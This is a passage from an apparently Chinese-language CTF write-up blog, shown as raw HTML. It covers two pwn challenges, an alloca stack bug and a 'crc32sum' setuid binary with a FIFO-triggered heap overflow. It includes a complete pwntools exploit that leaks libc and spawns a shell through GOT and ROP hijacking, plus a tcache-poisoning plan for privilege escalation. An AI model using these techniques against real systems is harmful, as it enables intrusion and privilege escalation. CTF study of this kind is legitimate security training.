class=\"type\">void</span> <span class=\"title function_\">setup</span><span class=\"params\">(<span class=\"type\">void</span>)</span> &#123;</span><br><span class=\"line\">  alarm(<span class=\"number\">180</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdin</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>alloca</code>  是在栈上分配内存 并自动释放<br>\n其实就一个指针指向栈上 然后 rsp 减下去罢了<br>\n宏的分配问题</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARRAY_SIZE(n) (n * sizeof(long))</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARRAY_NEW(n) (long*)alloca(ARRAY_SIZE(n + 1))</span></span><br><span class=\"line\"></span><br><span class=\"line\">=&gt; alloca(n + <span class=\"number\">1</span> * <span class=\"keyword\">sizeof</span>(<span class=\"type\">long</span>))</span><br></pre></td></tr></table></figure>\n<p>然后 <code>size</code>  如果能被覆盖的话 idx 就能越界了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> *v4; <span class=\"comment\">// rsp</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> __int64 size; <span class=\"comment\">// [rsp+8h] [rbp-20h] BYREF</span></span><br></pre></td></tr></table></figure>\n<p>这个 alloca 其实就是减去 rsp 然后往栈顶存放</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ rsp <span class=\"number\">0x7ffd12538830</span> —▸ <span class=\"number\">0x4013e3</span> (__libc_csu_init+<span class=\"number\">99</span>) ◂— pop    rdi</span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│     <span class=\"number\">0x7ffd12538838</span> —▸ <span class=\"number\">0x404020</span> (<span class=\"built_in\">printf</span>@got.plt) —▸ <span class=\"number\">0x7f2a5fcc3c90</span> (<span class=\"built_in\">printf</span>) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│     <span class=\"number\">0x7ffd12538840</span> —▸ <span class=\"number\">0x401094</span> (<span class=\"built_in\">printf</span>@plt+<span class=\"number\">4</span>) ◂— bnd jmp qword ptr [rip + <span class=\"number\">0x2f85</span>]</span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│     <span class=\"number\">0x7ffd12538848</span> —▸ <span class=\"number\">0x4010d0</span> (_start) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│     <span class=\"number\">0x7ffd12538850</span> ◂— <span class=\"number\">0x7fffffffffffffff</span>            [<span class=\"number\">1</span>] &lt;- size</span><br></pre></td></tr></table></figure>\n<p><code>%ld</code>  的最大写入为 <code>0x7fffffffffffffff</code> <br>\n 可以覆盖掉 size 和 arr 达到 got 表任意写的效果 可以通过不合法的值触发 exit</p>\n<p>再看看返回地址<br>\n如果在栈中触发 exit 的 got 会压入返回地址<br>\n只需要让 rsp+8 就能执行 ROP 了 也就是写个 pop ret</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rsp <span class=\"number\">0x7ffd12538830</span> —▸ <span class=\"number\">0x4013e3</span> (__libc_csu_init+<span class=\"number\">99</span>) ◂— pop    rdi</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538838</span> —▸ <span class=\"number\">0x404020</span> (<span class=\"built_in\">printf</span>@got.plt) —▸ <span class=\"number\">0x7f2a5fcc3c90</span> (<span class=\"built_in\">printf</span>) ◂— endbr64</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538840</span> —▸ <span class=\"number\">0x401094</span> (<span class=\"built_in\">printf</span>@plt+<span class=\"number\">4</span>) ◂— bnd jmp qword ptr [rip + <span class=\"number\">0x2f85</span>]</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538848</span> —▸ <span class=\"number\">0x4010d0</span> (_start) ◂— endbr64</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538850</span> ◂— <span class=\"number\">0x7fffffffffffffff</span>                                         [<span class=\"number\">2</span>] &lt;- size</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538858</span> ◂— <span class=\"number\">0x4</span></span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538860</span> —▸ <span class=\"number\">0x7ffd12538830</span> —▸ <span class=\"number\">0x4013e3</span> (__libc_csu_init+<span class=\"number\">99</span>) ◂— pop rdi [<span class=\"number\">1</span>] &lt;- arr</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538868</span> ◂— <span class=\"number\">0x2abd7f93dc67a400</span></span><br><span class=\"line\">rbp <span class=\"number\">0x7ffd12538870</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538878</span> —▸ <span class=\"number\">0x7f2a5fc86083</span> (__libc_start_main+<span class=\"number\">243</span>) ◂— mov    edi, eax</span><br></pre></td></tr></table></figure>\n<p>总流程如下</p>\n<ul>\n<li>通过 alloca 的指针在 rsp 栈顶布置我们的 rop 并劫持 size 后篡改 alloca 出来的指针 达到 got 任意写的效果</li>\n<li>进入 exit 的 got 的时候 会压入返回地址 执行 rop 的时候要 pop 掉这个</li>\n<li>ROP 用经典 plt 泄漏 got 的套路 并返回 main</li>\n<li>重复上述</li>\n</ul>\n<h2 id=\"exp-2\"><a class=\"markdownIt-Anchor\" href=\"#exp-2\">#</a> exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> * </span><br><span class=\"line\">context(os=<span class=\"string\">&quot;Linux&quot;</span>,arch=<span class=\"string\">&quot;amd64&quot;</span>,log_level=<span class=\"string\">&quot;debug&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./chall&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span>                    :p.recvline()</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims             :p.recvuntil(delims)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">info    = <span class=\"keyword\">lambda</span> tag, addr          :p.info(<span class=\"string\">&#x27;======&gt;&#x27;</span>+tag + <span class=\"string\">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class=\"built_in\">format</span>(addr))</span><br><span class=\"line\">ir      = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">ri      = <span class=\"keyword\">lambda</span>                    :raw_input()</span><br><span class=\"line\">ps      = <span class=\"keyword\">lambda</span>                    :pause()</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc-2.31.so&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./chall&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set</span>(<span class=\"params\">idx, val</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;index: &quot;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;value: &quot;</span>, <span class=\"built_in\">str</span>(val))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;size:&quot;</span>, <span class=\"string\">&quot;5&quot;</span>)<span class=\"comment\"># 0 - 5</span></span><br><span class=\"line\">\tpop_rdi = <span class=\"number\">0x4013e3</span></span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">0</span>, pop_rdi)</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">1</span> ,elf.got[<span class=\"string\">&quot;printf&quot;</span>])</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">2</span> ,elf.plt[<span class=\"string\">&quot;printf&quot;</span>])</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">3</span> ,elf.sym[<span class=\"string\">&quot;_start&quot;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># falsify size</span></span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">4</span> ,<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\">\t<span class=\"comment\"># hijack arr</span></span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">6</span> ,elf.got[<span class=\"string\">&quot;exit&quot;</span>])</span><br><span class=\"line\">\t<span class=\"comment\"># falsify got[exit]&#x27;s content</span></span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">0</span> ,pop_rdi)</span><br><span class=\"line\">\t<span class=\"comment\"># trigger</span></span><br><span class=\"line\">\tri()</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;index: &quot;</span>, <span class=\"string\">&quot;-1&quot;</span>)</span><br><span class=\"line\">\tleak = uu64(ru(<span class=\"string\">&quot;\\x7f&quot;</span>)[-<span class=\"number\">6</span>:])</span><br><span class=\"line\">\tinfo(<span class=\"string\">&quot;leak&quot;</span>,leak)</span><br><span class=\"line\">\tlibc_base = leak - <span class=\"number\">0x7ffff7e1fc90</span> + <span class=\"number\">0x7ffff7dbe000</span></span><br><span class=\"line\">\tinfo(<span class=\"string\">&quot;libc_base&quot;</span>,libc_base)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># pwn</span></span><br><span class=\"line\">\tbinsh = libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&quot;/bin/sh&quot;</span>))</span><br><span class=\"line\">\tsystem = libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;size:&quot;</span>, <span class=\"string\">&quot;5&quot;</span>)<span class=\"comment\"># 0 - 5</span></span><br><span class=\"line\">\tpop_rdi = <span class=\"number\">0x4013e3</span></span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">0</span>, pop_rdi)</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">1</span> ,binsh)</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">2</span> ,system)</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">4</span> ,<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">6</span> ,elf.got[<span class=\"string\">&quot;exit&quot;</span>])</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">0</span> ,pop_rdi)</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;index: &quot;</span>, <span class=\"string\">&quot;-1&quot;</span>)</span><br><span class=\"line\">\tir()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">\texp()</span><br></pre></td></tr></table></figure>\n<h2 id=\"关于逆向的一点补充\"><a class=\"markdownIt-Anchor\" href=\"#关于逆向的一点补充\">#</a> 关于逆向的一点补充</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v3 = <span class=\"number\">16</span> * ((size + <span class=\"number\">31</span>) / <span class=\"number\">0x10</span>);</span><br><span class=\"line\"><span class=\"keyword\">while</span> ( &amp;size != (<span class=\"type\">unsigned</span> __int64 *)((<span class=\"type\">char</span> *)&amp;size - (v3 &amp; <span class=\"number\">0xFFFFFFFFFFFFF000</span>LL)) )</span><br><span class=\"line\">  ;</span><br><span class=\"line\">v4 = alloca(v3 &amp; <span class=\"number\">0xFFF</span>);</span><br></pre></td></tr></table></figure>\n<p>这里就可以看到 size 在 1 - 17 之间的 v3 都是不会变的<br>\n也就是  <code>n + sizeof(long)</code>  与 0x10 对齐的情况</p>\n<h1 id=\"crc32sum\"><a class=\"markdownIt-Anchor\" href=\"#crc32sum\">#</a> crc32sum</h1>\n<p>权限逃逸（亦或者说普通堆</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ctype.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;limits.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/file.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Calculate CRC32 hash for data</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">crc32</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *data, <span class=\"type\">size_t</span> size)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> i, j;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> hash;</span><br><span class=\"line\"></span><br><span class=\"line\">  hash = <span class=\"number\">0xFFFFFFFF</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; size; i++) &#123;</span><br><span class=\"line\">    hash ^= data[i];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; CHAR_BIT; j++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (hash &amp; <span class=\"number\">1</span>)</span><br><span class=\"line\">        hash = (hash &gt;&gt; <span class=\"number\">1</span>) ^ <span class=\"number\">0xEDB88320</span>;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">        hash &gt;&gt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> hash ^ <span class=\"number\">0xFFFFFFFF</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Calculate CRC32 hash for file</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">crc32sum</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *filepath)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> fd;</span><br><span class=\"line\">  <span class=\"type\">char</span> *buffer, *p;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stat</span> <span class=\"title\">stbuf</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Try to open file */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((fd = open(filepath, O_RDONLY)) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    perror(filepath);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Lock file */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (flock(fd, LOCK_SH)) &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;flock&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Get file size */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fstat(fd, &amp;stbuf)) &#123;</span><br><span class=\"line\">    perror(filepath);</span><br><span class=\"line\">    flock(fd, LOCK_UN);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Allocate buffer */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!(buffer = <span class=\"built_in\">malloc</span>(stbuf.st_size))) &#123;    [<span class=\"number\">1</span>] &lt;&lt;- 漏洞点所在 pipe是没有size的</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;Memory Error&quot;</span>);</span><br><span class=\"line\">    flock(fd, LOCK_UN);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Read file */</span></span><br><span class=\"line\">  p = buffer;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (read(fd, p++, <span class=\"number\">1</span>) == <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Calculate hash */</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s: %08x\\n&quot;</span>, filepath, crc32(buffer, stbuf.st_size));</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Cleanup */</span></span><br><span class=\"line\">  <span class=\"built_in\">free</span>(buffer);</span><br><span class=\"line\">  flock(fd, LOCK_UN);</span><br><span class=\"line\">  close(fd);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Entry point</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> *filepath;</span><br><span class=\"line\"></span><br><span class=\"line\">  setreuid(geteuid(), geteuid());</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (argc &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Usage: %s &lt;file&gt; ...\\n&quot;</span>, argv[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (system(<span class=\"string\">&quot;/usr/bin/which crc32 &gt; /dev/null&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Your system has `crc32` too&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">1</span>; i &lt; argc; i++) &#123;</span><br><span class=\"line\">    filepath = strdup(argv[i]);</span><br><span class=\"line\">    crc32sum(filepath);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(filepath);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>思路 对于 <code>FIFO</code>  的管道   <code>stbuf.st_size</code>  是 0 这就造成了堆溢出<br>\n我们可以 <code>mkfifo</code>  创建堆块 然后溢出到下面的 0x40 的块（前提是要布置好两个 0x40)<br>\n 然后劫持 tcache 到 got 在劫持 free 成 system 的 plt<br>\n 这样就能直接 free (cmd) 命令执行了</p>\n<p>难点在于 strdup 会干扰堆布局 需要思考<br>\n和第一次 printf 会创建 0x400 的缓冲区 需要 bypass 这两即可</p>\n<h2 id=\"fifo\"><a class=\"markdownIt-Anchor\" href=\"#fifo\">#</a> FIFO</h2>\n<p><strong>命名管道</strong>也被称为 FIFO 文件<br>\n管道是没法被 stat 结构体读取到数据的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ctype.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;limits.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/file.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span 